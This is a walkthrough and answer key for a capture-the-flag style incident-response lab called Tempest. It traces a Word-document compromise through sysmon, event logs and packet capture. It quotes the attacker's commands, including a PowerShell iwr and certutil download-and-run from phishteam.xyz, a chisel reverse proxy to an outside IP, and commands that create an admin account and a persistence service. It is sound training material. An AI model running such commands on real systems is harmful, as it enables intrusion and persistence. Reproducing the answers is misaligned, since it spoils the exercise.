# Tempest

### Preparation - Tools and Artifacts
![image](https://github.com/user-attachments/assets/e45d77a9-4506-45a5-b944-cebe3beb554b)<br />
- What is the SHA256 hash of the capture.pcapng file? `CB3A1E6ACFB246F256FBFEFDB6F494941AA30A5A7C3F5258C3E63CFA27A23DC6`
- What is the SHA256 hash of the sysmon.evtx file? `665DC3519C2C235188201B5A8594FEA205C3BCBC75193363B87D2837ACA3C91F`
- What is the SHA256 hash of the windows.evtx file? `D0279D5292BC5B25595115032820C978838678F4333B725998CFE9253E186D60`

### Initial Access - Malicious Document
- The user of this machine was compromised by a malicious document. What is the file name of the document?<br />
Move in `C:\Tools\EvtxECmd\` and run `.\EvtxECmd.exe -f 'C:\Users\user\Desktop\Incident Files\sysmon.evtx' --csv 'C:\Users\user\Desktop\Incident Files' --csvf sysmon.csv`. Then open the .csv file using Timeline Explorer and filter for `.doc`:<br />
![image](https://github.com/user-attachments/assets/df7282ec-684e-42ac-b9e1-c2d3a13e7256)<br />
`free_magicules.doc`
- What is the name of the compromised user and machine? `benimaru-TEMPEST`
- What is the PID of the Microsoft Word process that opened the malicious document? <br />
PID `496` used WINWORD.EXE to open the malicious doc. 
- Based on Sysmon logs, what is the IPv4 address resolved by the malicious domain used in the previous question?<br />
Filter by 496, and event ID = 22: <br />
![image](https://github.com/user-attachments/assets/42f50773-fd42-4619-a5b2-27f15ce6984f)<br />
`167.71.199.191`
- What is the base64 encoded string in the malicious payload executed by the document? <br />
Considering that the document executes a payload, it means that the parent PID of this process is 496.<br />
![image](https://github.com/user-attachments/assets/aab15431-87e5-418c-b04a-123583ad17b2)<br />
- What is the CVE number of the exploit used by the attacker to achieve a remote code execution? <br />
The payload is the following: `$app=[Environment]::GetFolderPath('ApplicationData');cd "$app\Microsoft\Windows\Start Menu\Programs\Startup"; iwr http://phishteam.xyz/02dcf07/update.zip -outfile update.zip; Expand-Archive .\update.zip -DestinationPath .; rm update.zip;` and it refers to<br />
`2022-30190`

### Initial Access - Stage 2 execution
- The malicious execution of the payload wrote a file on the system. What is the full target path of the payload?<br />
`C:\Users\benimaru\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`
- The implanted payload executes once the user logs into the machine. What is the executed command upon a successful login of the compromised user? `“C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe” -w hidden -noni certutil -urlcache -split -f ‘http://phishteam.xyz/02dcf07/first.exe' C:\Users\Public\Downloads\first.exe; C:\Users\Public\Downloads\first.exe`
- Based on Sysmon logs, what is the SHA256 hash of the malicious binary downloaded for stage 2 execution? `CE278CA242AA2023A4FE04067B0A32FBD3CA1599746C160949868FFC7FC3D7D8`
- The stage 2 payload downloaded establishes a connection to a c2 server. What is the domain and port used by the attacker? `resolvecyber.xyz:80`

### Initial Access - Malicious Document Traffic
- What is the URL of the malicious payload embedded in the document? `http://phishteam.xyz/02dcf07/index.html`
- What is the encoding used by the attacker on the c2 connection? `base64`
- The malicious c2 binary sends a payload using a parameter that contains the executed command results. What is the parameter used by the binary? `q`
- The malicious c2 binary connects to a specific URL to get the command to be executed. What is the URL used by the binary? `/9ab62b5`
- What is the HTTP method used by the binary? `GET`
- Based on the user agent, what programming language was used by the attacker to compile the binary? `nim`

### Discovery - Internal Reconnaissance
- The attacker was able to discover a sensitive file inside the machine of the user. What is the password discovered on the aforementioned file? `infernotempest`
- The attacker then enumerated the list of listening ports inside the machine. What is the listening port that could provide a remote shell inside the machine? `5985`
- The attacker then established a reverse socks proxy to access the internal services hosted inside the machine. What is the command executed by the attacker to establish the connection? `C:\Users\benimaru\Downloads\ch.exe client 167.71.199.191:8080 R:socks`
- What is the SHA256 hash of the binary used by the attacker to establish the reverse socks proxy connection? `SHA256=8A99353662CCAE117D2BB22EFD8C43D7169060450BE413AF763E8AD7522D2451`
- What is the name of the tool used by the attacker based on the SHA256 hash? Provide the answer in lowercase. `chisel`
- The attacker then used the harvested credentials from the machine. Based on the succeeding process after the execution of the socks proxy, what service did the attacker use to authenticate?

### Privilege Escalation - Exploiting Privileges
- After discovering the privileges of the current user, the attacker then downloaded another binary to be used for privilege escalation. What is the name and the SHA256 hash of the binary? `spf.exe,8524FBC0D73E711E69D60C64F1F1B7BEF35C986705880643DD4D5E17779E586D`
- Based on the SHA256 hash of the binary, what is the name of the tool used? `PrintSpoofer`
- The tool exploits a specific privilege owned by the user. What is the name of the privilege? `SeImpersonatePrivilege`
- Then, the attacker executed the tool with another binary to establish a c2 connection. What is the name of the binary? `final.exe`
- The binary connects to a different port from the first c2 connection. What is the port used? `8080`

### Actions on Objective - Fully-owned Machine
- Upon achieving SYSTEM access, the attacker then created two users. What are the account names? `shion, shuna`
- Prior to the successful creation of the accounts, the attacker executed commands that failed in the creation attempt. What is the missing option that made the attempt fail? `/add`
- Based on windows event logs, the accounts were successfully created. What is the event ID that indicates the account creation activity? `4720`
- The attacker added one of the accounts in the local administrator's group. What is the command used by the attacker? `net localgroup administrators /add shion`
- Based on windows event logs, the account was successfully added to a sensitive group. What is the event ID that indicates the addition to a sensitive local group? `4732`
- After the account creation, the attacker executed a technique to establish persistent administrative access. What is the command executed by the attacker to achieve this? `C:\Windows\system32\sc.exe \\TEMPEST create TempestUpdate2 binpath= C:\ProgramData\final.exe start= auto`
